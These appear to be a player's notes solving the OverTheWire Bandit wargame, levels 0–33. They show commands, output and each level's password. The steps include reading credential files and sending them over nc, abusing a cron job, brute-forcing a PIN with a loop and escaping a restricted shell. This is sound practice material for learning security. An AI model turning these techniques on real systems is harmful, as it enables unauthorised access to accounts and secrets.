## _BANDIT_
# Niveau 0
- ssh bandit0@bandit.labs.overthewire.org -p 2220
- mot de passe: bandit0

# Niveau 0 → Niveau 1
- bandit0@bandit:~$ cat ~/readme
mot de passe : NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
- bandit0@bandit:~$ exit

# Niveau 1 → Niveau  2
- bandit1@bandit:~$ ls
>  '-'
- bandit1@bandit:~$ cat ./-
mot de passe : rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

# Niveau 2 → Niveau  3
- bandit2@bandit:~$ ls
> spaces in this filename
- bandit2@bandit:~$ cat 'spaces in this filename'
- mot de passe : aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG

# Niveau 3→ Niveau  4
- bandit3@bandit:~$ ls
> inhere
- bandit3@bandit:~$ cd inhere/
- bandit3@bandit:~/inhere$ ls -a
>  ..  .hidden
- bandit3@bandit:~/inhere$ cat .hidden
- mot de passe : 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe

# Niveau 4 → Niveau 5
- bandit4@bandit:~$ ls
> inhere
- bandit4@bandit:~$ file inhere/*
- bandit4@bandit:~$ cat inhere/-file07
- mot de passe :  lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR

# Niveau 5 → Niveau  6
- bandit5@bandit:~$ cd inhere
- bandit5@bandit:~/inhere$ ls
- bandit5@bandit:~/inhere$ find -maxdepth 2 -type f -size 1033c
> /maybehere07/.file2
- bandit5@bandit:~/inhere$ cat ./maybehere07/file2
> cat: ./maybehere07/file2: No such file or directory
- bandit5@bandit:~/inhere$ cat ./maybehere07/.file2
- mot de passe : P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU

# Niveau 6 → Niveau  7
- bandit6@bandit:~$  pwd
>  '/home/bandit6'
- bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
>  /var/lib/dpkg/info/bandit7.password
- bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
- mot de passe : z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S

# Niveau 7 → Niveau 8
- bandit7@bandit:~$ ls
v  data.txt
- bandit7@bandit:~$ nano data.txt
>  ^W
> - search : millionth
- mot de passe :TESKZC0XvTetK0S9xNwm25STk5iWrBvP

# Niveau 8 → Niveau 9
- bandit8@bandit:~$ sort data.txt | uniq -u
- EN632PlfYiZbn3PhVK3XOGSlNInNE00t

# Niveau 9 → Niveau 10
- bandit9@bandit:~$ strings data.txt
- ========== 
- mot de passe : G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s

# Niveau 10 → Niveau 11
- bandit10@bandit:~$ ls
 > data.txt
- bandit10@bandit:~$ cat data.txt
 v VGhlIHBhc3N3b3JkIGlzIDZ6UGV6aUxkUjJSS05kTllGTmI2blZDS3pwaGxYSEJNCg==
- bandit10@bandit:~$ base64 -d data.txt
- The password is : 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM

# Niveau 11 → Niveau  12
- bandit11@bandit:~$ ls
> data.txt
- bandit11@bandit:~$ cat data.txt
 > Gur cnffjbeq vf WIAOOSFzMjXXBC0KoSKBbJ8puQm5lIEi
- bandit11@bandit:~$ echo | cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
- The password is : JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv

# Niveau 12 → Niveau 13
- bandit12@bandit:mkdir /tmp/gxuvimr$
- bandit12@bandit:cd /tmp/gxuvimr$
- bandit12@bandit:/tmp/gxuvimr$ xxd -r data.txt > data
- bandit12@bandit:/tmp/gxuvimr$ ls
 > data  data.txt
- bandit12@bandit:/tmp/gxuvimr$ file data
> data: gzip compressed data, was "data2.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
- bandit12@bandit:/tmp/gxuvimr$ mv data data.gz
- bandit12@bandit:/tmp/gxuvimr$ gzip -d data.gz
- bandit12@bandit:/tmp/gxuvimr$ file data
> data: bzip2 compressed data, block size = 900k
- bandit12@bandit:/tmp/gxuvimr$ mv data data.bz2
- bandit12@bandit:/tmp/gxuvimr$ bzip2 -d data.bz2
- bandit12@bandit:/tmp/gxuvimr$ file data
> data: gzip compressed data, was "data4.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
- bandit12@bandit:/tmp/gxuvimr$ mv data data.gz
- bandit12@bandit:/tmp/gxuvimr$ gzip -d data.gz
- bandit12@bandit:/tmp/gxuvimr$ file data
> data: POSIX tar archive (GNU)
- bandit12@bandit:/tmp/gxuvimr$ mv data data.tar
- bandit12@bandit:/tmp/gxuvimr$ tar -xvf data.tar
> data5.bin
- bandit12@bandit:/tmp/gxuvimr$ ls
> data5.bin  data.tar  data.txt
- bandit12@bandit:/tmp/gxuvimr$ file data5.bin
> data5.bin: POSIX tar archive (GNU)
- bandit12@bandit:/tmp/gxuvimr$ mv data5.bin data5.tar
- bandit12@bandit:/tmp/gxuvimr$ tar -xvf data5.tar
> data6.bin
- bandit12@bandit:/tmp/gxuvimr$ file data6.bin
> data6.bin: bzip2 compressed data, block size = 900k
- bandit12@bandit:/tmp/gxuvimr$ mv data6.bin data6.bz2
- bandit12@bandit:/tmp/gxuvimr$ bzip2 -d data6.bz2
- bandit12@bandit:/tmp/gxuvimr$ file data6
> data6: POSIX tar archive (GNU)
- bandit12@bandit:/tmp/gxuvimr$ mv data6 data6.tar
- bandit12@bandit:/tmp/gxuvimr$ tar -xvf data6.tar
> data8.bin
- bandit12@bandit:/tmp/gxuvimr$ file data8.bin
> data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
- bandit12@bandit:/tmp/gxuvimr$ mv data8.bin data8.gz
- bandit12@bandit:/tmp/gxuvimr$ gzip -d data8.gz
- bandit12@bandit:/tmp/gxuvimr$ file data8
> data8: ASCII text
- bandit12@bandit:/tmp/gxuvimr$ cat data8
- The password is : wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw

# Niveau 13 → Niveau  14
- bandit13@bandit:~$ ls
> sshkey.private
ssh -i sshkey.private -p 2220 bandit14@localhost
- bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
- mot de passe :fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq

# Niveau 14 → Niveau 15
- bandit14@bandit:~$ nc localhost 30000 < /etc/bandit_pass/bandit14
Correct!
- mot de passe : jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt

# Niveau 15→ Niveau  16
- bandit15@bandit:~$ openssl s_client -connect localhost:30001 -quiet < /etc/bandit_pass/bandit15
> Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = localhost
verify error:num=10:certificate has expired
notAfter=May  5 11:21:25 2023 GMT
verify return:1
depth=0 CN = localhost
notAfter=May  5 11:21:25 2023 GMT
verify return:1
Correct!
- mot de passe :JQttfApK4SeyHwDlI9SXGR50qclOAil1

# Niveau 16 → Niveau  17
- bandit16@bandit:~$ nmap -sV -p 31000-32000 localhost
> Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-06 19:52 UTC
Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 19:54 (0:00:17 remaining)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE     VERSION
> 31046/tcp open  echo
> 31518/tcp open  ssl/echo
> 31691/tcp open  echo
> 31790/tcp open  ssl/unknown
> 31960/tcp open  echo
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.11 seconds

- bandit16@bandit:~$ openssl s_client -connect localhost:31790 -quiet < /etc/bandit_pass/bandit16
> Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = localhost
verify error:num=10:certificate has expired
notAfter=May  5 11:21:24 2023 GMT
verify return:1
depth=0 CN = localhost
notAfter=May  5 11:21:24 2023 GMT
verify return:1
Correct!
-----BEGIN RSA PRIVATE KEY-----
--
-----END RSA PRIVATE KEY-----
- bandit16@bandit:~$ PRIVATE_KEY=$(mktemp)
- bandit16@bandit:~$ openssl s_client \
 >  -connect localhost:31790 \
  -quiet < /etc/bandit_pass/bandit16 > $PRIVATE_KEY
> Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = localhost
verify error:num=10:certificate has expired
notAfter=May  5 11:21:24 2023 GMT
verify return:1
depth=0 CN = localhost
notAfter=May  5 11:21:24 2023 GMT
verify return:1
bandit16@bandit:~$ ssh -i $PRIVATE_KEY -p 2220 bandit17@localhost

- connect : bandit17@bandit:~$

# Niveau 17 → Niveau  18
- bandit17@bandit:~$ diff passwords.old passwords.new
> 42c42
< glZreTEH1V3cGKL6g4conYqZqaEj0mte
Good password : hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg

# Niveau 18 → Niveau  19
> Byebye !
Connection to bandit.labs.overthewire.org closed.
ssh -p 2220 bandit18@bandit.labs.overthewire.org cat readme
bandit18@bandit.labs.overthewire.org's password:
- mot de passe :awhqfNnAbc1naukrpqDYcF95h7HoMTrC

# Niveau 19 → Niveau  20
- bandit19@bandit:~$ ls
bandit20-do
- bandit19@bandit:~$ ./bandit20-do
> Run a command as another user.
  Example: ./bandit20-do id
bandit19@bandit:~$ id
uid=11019(bandit19) gid=11019(bandit19) groups=11019(bandit19)
bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
- bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
- mot de passe :VxCazJaVykI6W36BkBU0mJTCM8rR95XT

# Niveau 20 → Niveau  21
PC1
- bandit20@bandit:~$ ls
> suconnect
- bandit20@bandit:~$ man nc
- bandit20@bandit:~$ man nc
- bandit20@bandit:~$ ./suconnect
> Usage: ./suconnect <portnumber>
> This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
bandit20@bandit:~$ ./suconnect 9999
Read: 46bCDdFhklNnrStUuvZz
ERROR: This doesn't match the current password!
bandit20@bandit:~$ ./suconnect 8080
Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
Password matches, sending next password


- PC2
- bandit20@bandit:~$ nc -lvp 9999
>Listening on 0.0.0.0 9999
Connection received on localhost 36056
46bCDdFhklNnrStUuvZz
FAIL!
- bandit20@bandit:~$ nc -lvp 8000
>nc: Address already in use
bandit20@bandit:~$ nc -lvp 8080
Listening on 0.0.0.0 8080
Connection received on localhost 37696
VxCazJaVykI6W36BkBU0mJTCM8rR95XT
- good password : NvEJF7oVjkddltPSrdKEFOllh9V1IBcq

# Niveau 21 → Niveau  22
- bandit21@bandit:~$ ls -l /etc/cron.d
> total 36
-rw-r--r-- 1 root root  62 Apr 23 18:04 cronjob_bandit15_root
-rw-r--r-- 1 root root  62 Apr 23 18:04 cronjob_bandit17_root
-rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit22
-rw-r--r-- 1 root root 122 Apr 23 18:04 cronjob_bandit23
-rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit24
-rw-r--r-- 1 root root  62 Apr 23 18:04 cronjob_bandit25_root
-rw-r--r-- 1 root root 201 Jan  8  2022 e2scrub_all
-rwx------ 1 root root  52 Apr 23 18:05 otw-tmp-dir
-rw-r--r-- 1 root root 396 Feb  2  2021 sysstat
- bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
- bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
- bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
- bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
- mot de passe :WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff

# Niveau 22 → Niveau  23

- bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
> @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
 bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
- bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
> #!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget
- bandit22@bandit:~$ echo I am user bandit23 | md5sum
>8ca319486bfbbc3663ea0fbe81326349  -
8ca319486bfbbc3663ea0fbe81326349  -
8ca319486bfbbc3663ea0fbe81326349: command not found

- bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
> #!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget

- bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
- mot de passe :QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

# Niveau 23 → Niveau  24

- bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
'@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null' 
 '* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null'
- bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
> #!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done

- bandit23@bandit:~$ mkdir -p /tmp/gxuvimr
- bandit23@bandit:~$ cd /tmp/gxuvimr
- bandit23@bandit:/tmp/gxuvimr$ touch pass.sh
- bandit23@bandit:/tmp/gxuvimr$ nano pass.sh
> Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

- bandit23@bandit:/tmp/gxuvimr$ cat /usr/bin/cronjob_bandit24.sh
> #!/bin/bash
> myname=$(whoami)

> cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
> done

- bandit23@bandit:/tmp/gxuvimr$ chmod g+s pass.sh
- bandit23@bandit:/tmp/gxuvimr$ ls -la
total 1164
drwxrwsrwx   2 bandit23 bandit23    4096 May  7 08:36 .
drwxrwx-wt 317 root     root     1179648 May  7 08:49 ..
-rwxr-sr-x   1 bandit23 bandit23      62 May  7 08:14 pass.sh
bandit23@bandit:/tmp/gxuvimr$ chown bandit24:bandit24 /var/spool/bandit24/pass.shchown bandit24:bandit24 /var/spool/bandit24/pass.shchown bandit24:bandit24 /var/spool/bandit
- bandit23@bandit:/tmp/gxuvimr$ cp pass.sh /var/spool/bandit24/foo/
- bandit23@bandit:/tmp/gxuvimr$ ls
pass.sh
- bandit23@bandit:/tmp/gxuvimr$ cat pass.sh
#!/bin/bash
- bandit23@bandit:~$ cd /tmp/gxuvimr
- bandit23@bandit:/tmp/gxuvimr$ ls -la

> total 1168
drwxrwsrwx   2 bandit23 bandit23    4096 May  7 08:54 .
drwxrwx-wt 330 root     root     1179648 May  7 09:01 ..
-rw-rw-r--   1 bandit24 bandit23      33 May  7 08:54 pass
-rwxr-sr-x   1 bandit23 bandit23      62 May  7 08:14 pass.sh

- bandit23@bandit:/tmp/gxuvimr$ cat pass
- mot de passe :  VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

# Niveau 24 → Niveau  25
- bandit24@bandit:~$ nc localhost 30002
>I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Timeout. Exiting.

- bandit24@bandit:~$ pass=$(cat /etc/bandit_pass/bandit24)
- bandit24@bandit:~$ for pin in {0..9}{0..9}{0..9}{0..9}; do echo $pass $pin; done | nc localhost 30002 | grep -v Wrong
> I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
Exiting.

# Niveau 25 → Niveau  26
- sh -i ./bandit26.sshkey bandit26@localhost
- 
> Connection to localhost closed.

- bandit25@bandit:~$ grep bandit26 /etc/passwd
- bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
- bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

> export TERM=linux
more ~/text.txt
exit 0

> :shell
:set shell ?
:set shell=/bin/bash
- bandit26@bandit:~$ ls
- bandit27-do  text.txt
- bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
- mot de passe : c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1

# Niveau 26 → Niveau  27
> :shell
:set shell ?
:set shell=/bin/bash
- bandit26@bandit:~$ ls
- bandit27-do  text.txt
- bandit26@bandit:~$ ./bandit27-do id
uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
- bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
- mot de passe: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS


# Niveau 27 → Niveau  28
- bandit27@bandit:~$ mktemp -d
/tmp/tmp.5zCDWGgLtn
- bandit27@bandit:~$ cd /tmp/tmp.5zCDWGgLtn
- bandit27@bandit:/tmp/mygit$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo $dest
- bandit27@bandit:/tmp/mygit/repo$ cat README
- The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR

# Niveau 28 → Niveau  29
- bandit28@bandit:~$ ls
bandit28@bandit:~$ dest=$(mktemp -d)
bandit28@bandit:~$ ls

This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit28/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).

- bandit28@bandit:~$ ls $dest
>README.md
bandit28@bandit:~$ cat $dest/README.md
> '# Bandit Notes'
Some notes for level29 of bandit.
> '## credentials'
username: bandit29
password: xxxxxxxxxx
- bandit28@bandit:~$ cd $dest
- bandit28@bandit:/tmp/tmp.tVGPTB8Jco$ ls
> README.md
- bandit28@bandit:/tmp/tmp.tVGPTB8Jco$ cat $dest/README.md
'# Bandit Notes'
> Some notes for level29 of bandit.
'## credentials'
> username: bandit29
password: xxxxxxxxxx

- bandit28@bandit:/tmp/tmp.tVGPTB8Jco$ cat README.md
> '# Bandit Notes'
Some notes for level29 of bandit.
' ## credentials' 
username: bandit29
password: xxxxxxxxxx

- bandit28@bandit:/tmp/tmp.tVGPTB8Jco$ git log
> commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Sun Apr 23 18:04:39 2023 +0000
fix info leak

> commit abcff758fa6343a0d002a1c0add1ad8c71b88534
Author: Morla Porla <morla@overthewire.org>
Date:   Sun Apr 23 18:04:39 2023 +0000
add missing data

> commit c0a8c3cf093fba65f4ee0e1fe2a530b799508c78
Author: Ben Dover <noone@overthewire.org>
Date:   Sun Apr 23 18:04:39 2023 +0000
initial commit of README.md
- bandit28@bandit:/tmp/tmp.tVGPTB8Jco$ git show HEAD
> commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Sun Apr 23 18:04:39 2023 +0000
    fix info leak
diff --git a/README.md b/README.md
index b302105..5c6457b 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 '## credentials'

 - username: bandit29
- - password : tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
- +- password: xxxxxxxxxx

# Niveau 29 → Niveau  30

- bandit29@bandit:~$ dest=$(mktemp -d)
- bandit29@bandit:~$ git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo $dest
- bandit29@bandit:~$ cd $dest
- bandit29@bandit:/tmp/tmp.FOn9GcEWIg$ git branch -a
- bandit29@bandit:/tmp/tmp.FOn9GcEWIg$ git show origin/dev
> commit 13e735685c73e5e396252074f2dca2e415fbcc98 (origin/dev)
Author: Morla Porla <morla@overthewire.org>
Date:   Sun Apr 23 18:04:40 2023 +0000
    add data needed for development
diff --git a/README.md b/README.md
index 1af21d3..a4b1cf1 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for bandit30 of bandit.
 ## credentials
 - username: bandit30
-- password: <no passwords in production!>
+- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS

# Niveau 30 → Niveau 31

- bandit30@bandit:~$ dest=$(mktemp -d)
- bandit30@bandit:~$ git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo $dest
- bandit30@bandit:~$ cd $dest
- bandit30@bandit:/tmp/tmp.WtD2IXQ6VY$ git tag
> secret
- bandit30@bandit:/tmp/tmp.WtD2IXQ6VY$ git show secret
- mot de passe : OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt

# Niveau 31 → Niveau 32

- bandit31@bandit:~$ dest=$(mktemp -d)
- bandit31@bandit:~$ git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo $dest
- bandit31@bandit:~$ cd $dest
- bandit31@bandit:/tmp/tmp.kMGdHjN3sW$ cat .gitignore
> *.txt
- bandit31@bandit:/tmp/tmp.kMGdHjN3sW$ cat README.md
- bandit31@bandit:/tmp/tmp.kMGdHjN3sW$ echo 'May I come in?' > key.txt
- bandit31@bandit:/tmp/tmp.kMGdHjN3sW$ rm .gitignore
- bandit31@bandit:/tmp/tmp.kMGdHjN3sW$ git add key.txt
- bandit31@bandit:/tmp/tmp.kMGdHjN3sW$ git commit -m 'May I come in?'
- bandit31@bandit:/tmp/tmp.kMGdHjN3sW$ git push
- bandit31-git@localhost's password:
> Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 327 bytes | 327.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
remote: ### Attempting to validate files... ####
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Well done! Here is the password for the next level:
mot de passe - remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
To ssh://localhost:2220/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://localhost:2220/home/bandit31                                                                                                                       -git/repo'

# Niveau 31 → Niveau  33
   
  Enjoy your stay!
> WELCOME TO THE UPPERCASE SHELL
> '>> ls -la'
sh: 1: LS: not found
'>> $0'
>$ ls -la
total 36
drwxr-xr-x  2 root     root      4096 Apr 23 18:04 .
drwxr-xr-x 70 root     root      4096 Apr 23 18:05 ..
-rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root     root       807 Jan  6  2022 .profile
-rwsr-x---  1 bandit33 bandit32 15128 Apr 23 18:04 uppershell
$ whoami
bandit33
$ cat /etc/bandit\_pass/bandit33

- mot de passe :  odHo63fHiFqcWWJG9rLiLDtPm45KzUKy

# Niveau 33 → Niveau  34
>bandit33@bandit:~$ cat README.txt
Congratulations on solving the last level of this game!
At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.
If you have an idea for an awesome new level, please let us know!
bandit33@bandit:~$

